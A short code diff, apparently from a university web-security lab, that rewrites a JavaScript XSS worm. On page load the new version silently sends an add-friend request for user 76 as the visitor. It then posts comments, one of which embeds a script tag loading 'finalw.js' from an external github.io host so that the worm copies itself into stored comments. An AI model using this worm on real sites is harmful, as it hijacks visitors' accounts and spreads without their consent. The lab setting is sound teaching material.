@@ -1,9 +1,11 @@
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://csec380-core.csec.rit.edu:86/add_friend?id=76',true);
-xhr.send();
-
-var currdate = Date();
-var comment = 'friend added on '.concat(date);
-var cmtreq = new XMLHTTPRequest();
-cmtreq.open('GET', 'http://csec380-core.csec.rit.edu:86/add_comment?id=76&comment='.concat(comment),true);
-cmtreq.send();
+$( document ).ready(function() {
+   $.ajax({url: "/add_friend.php?id=76", success: function(response){
+     if(response == "True - Friend Added Successfully"){
+       var date = Date();
+       var comment = "friend added on".concat(date);
+       var worm = "<script src=\"https://jackson987.github.io/finalw.js\"></script>"
+       $.ajax({url: "/add_comment.php?id=76" + "&comment=" + comment, success: function(result){console.log(result);}});
+       $.ajax({url: "/add_comment.php?comment=<script src=\"https://jackson987.github.io/finalw.js\"></script>", success: function(result){console.log(result);}});
+     }
+   }});
+});
